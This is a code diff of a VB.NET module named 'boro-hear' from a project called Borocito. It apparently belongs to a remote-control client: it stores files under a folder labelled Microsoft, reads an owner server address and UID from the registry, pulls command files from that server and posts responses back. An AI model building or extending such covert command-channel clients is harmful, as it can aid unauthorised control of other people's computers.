@@ -8,7 +8,7 @@ Module Utility
     Sub AddToLog(ByVal from As String, ByVal content As String, Optional ByVal flag As Boolean = False)
         Try
             Dim OverWrite As Boolean = False
-            If My.Computer.FileSystem.FileExists(DIRCommons & "\" & My.Application.Info.AssemblyName & ".log") Then
+            If My.Computer.FileSystem.FileExists(DIRHome & "\" & My.Application.Info.AssemblyName & ".log") Then
                 OverWrite = True
             End If
             Dim finalContent As String = Nothing
@@ -19,7 +19,7 @@ Module Utility
             tlmContent = tlmContent & Message & vbCrLf
             Console.WriteLine("[" & from & "]" & finalContent & " " & content)
             Try
-                My.Computer.FileSystem.WriteAllText(DIRCommons & "\" & My.Application.Info.AssemblyName & ".log", vbCrLf & Message, OverWrite)
+                My.Computer.FileSystem.WriteAllText(DIRHome & "\" & My.Application.Info.AssemblyName & ".log", vbCrLf & Message, OverWrite)
             Catch
             End Try
         Catch ex As Exception
@@ -41,7 +41,8 @@ Module Utility
 End Module
 Module GlobalUses
     Public parameters As String
-    Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito\boro-hear"
+    Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito"
+    Public DIRHome As String = DIRCommons & "\boro-get\" & My.Application.Info.AssemblyName
 
     Public HttpOwnerServer As String
     Public UID As String
@@ -50,9 +51,10 @@ Module GlobalUses
 End Module
 Module StartUp
     Sub Init()
+        AddToLog("Init", My.Application.Info.AssemblyName & " " & My.Application.Info.Version.ToString & " (" & Application.ProductVersion & ")" & " has started! " & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy"), True)
         Try
             CommonActions()
-            CheckInstall()
+            LoadRegedit()
         Catch ex As Exception
             AddToLog("Init@StartUp", "Error: " & ex.Message, True)
         End Try
@@ -62,34 +64,62 @@ Module StartUp
             If Not My.Computer.FileSystem.DirectoryExists(DIRCommons) Then
                 My.Computer.FileSystem.CreateDirectory(DIRCommons)
             End If
+            If Not My.Computer.FileSystem.DirectoryExists(DIRHome) Then
+                My.Computer.FileSystem.CreateDirectory(DIRHome)
+            End If
         Catch ex As Exception
             AddToLog("CommonActions@StartUp", "Error: " & ex.Message, True)
         End Try
     End Sub
-    Sub CheckInstall()
+    Sub LoadRegedit()
         Try
-            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-hear", True)
-            If regKey Is Nothing Then
-                Registry.CurrentUser.CreateSubKey("SOFTWARE\\Borocito\\boro-hear")
-                regKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-hear", True)
-            End If
-
-            regKey.SetValue("boro-hear", Application.ExecutablePath)
-            regKey.SetValue("Name", My.Application.Info.AssemblyName)
-            regKey.SetValue("Version", My.Application.Info.Version.ToString)
-
-            regKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
+            AddToLog("LoadRegedit@Memory", "Loading data...", False)
+            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
             HttpOwnerServer = "http://" & regKey.GetValue("OwnerServer")
             UID = regKey.GetValue("UID")
+            RegisterInstance()
         Catch ex As Exception
-            AddToLog("CheckInstall@StartUp", "Error: " & ex.Message, True)
+            AddToLog("LoadRegedit@StartUp", "Error: " & ex.Message, True)
             End
+        End Try
+    End Sub
+    Sub RegisterInstance()
+        Try
+            Dim llaveReg As String = "SOFTWARE\\Borocito\\boro-get\\" & My.Application.Info.AssemblyName
+            Dim registerKey As RegistryKey = Registry.CurrentUser.OpenSubKey(llaveReg, True)
+            If registerKey IsNot Nothing Then
+                registerKey.SetValue("Version", My.Application.Info.Version.ToString & " (" & Application.ProductVersion & ")")
+            End If
+        Catch ex As Exception
+            AddToLog("RegisterInstance@StartUp", "Error: " & ex.Message, True)
         End Try
     End Sub
 End Module
 Module ResponseAdministrator
+    Public messageQueue As New ArrayList
+
+    'En desarrollo
+    Sub AddMessageToQueue(ByVal message As String)
+        Try
+            messageQueue.Add(message)
+            ProcessMessageQueue()
+        Catch ex As Exception
+            AddToLog("AddMessageToQueue@server_CONNECT", "Error: " & ex.Message, True)
+        End Try
+    End Sub
+    Sub ProcessMessageQueue()
+        Try
+            For Each item As String In messageQueue
+                SendToServer(item)
+            Next
+        Catch ex As Exception
+            AddToLog("ProcessMessageQueue@server_CONNECT", "Error: " & ex.Message, True)
+        End Try
+    End Sub
+
     Sub SendToServer(ByVal message As String)
         Try
+            Threading.Thread.Sleep(5000) '5 sec para evitar solapados
             If sendStatus Then
                 AddToLog("SendToServer@server_CONNECT", "Processing: " & message, False)
                 'Create CMD file on server
@@ -97,7 +127,7 @@ Module ResponseAdministrator
                 request.Method = "POST"
                 'Obtener comando actual (evita interferir)
                 Dim remoteCommandFile As String = HttpOwnerServer & "/Users/Commands/[" & UID & "]Command.str"
-                Dim localCommandFile As String = DIRCommons & "\actualCommand.str"
+                Dim localCommandFile As String = DIRHome & "\actualCommand.str"
                 If My.Computer.FileSystem.FileExists(localCommandFile) Then
                     My.Computer.FileSystem.DeleteFile(localCommandFile)
                 End If
@@ -106,8 +136,8 @@ Module ResponseAdministrator
                 'Prepara el mensaje
                 Dim postData As String = "ident=" & UID & "&text=" & "#boro-hear response (" & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & ")" &
                     vbCrLf & "Command1>" & lineas(1).Split(">"c)(1).Trim() &
-                    vbCrLf & "Command2>" &
-                    vbCrLf & "Command3>" &
+                    vbCrLf & "Command2>" & lineas(2).Split(">"c)(1).Trim() &
+                    vbCrLf & "Command3>" & lineas(3).Split(">"c)(1).Trim() &
                     vbCrLf & "[Response]" &
                     vbCrLf & "(BORO-HEAR) " & message
                 Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
@@ -129,3 +159,4 @@ Module ResponseAdministrator
         End Try
     End Sub
 End Module
+'Si ya hay un mensaje BORO-HEAR en el fichero de comando, entonces deberia escribirse en la siguiente linea.
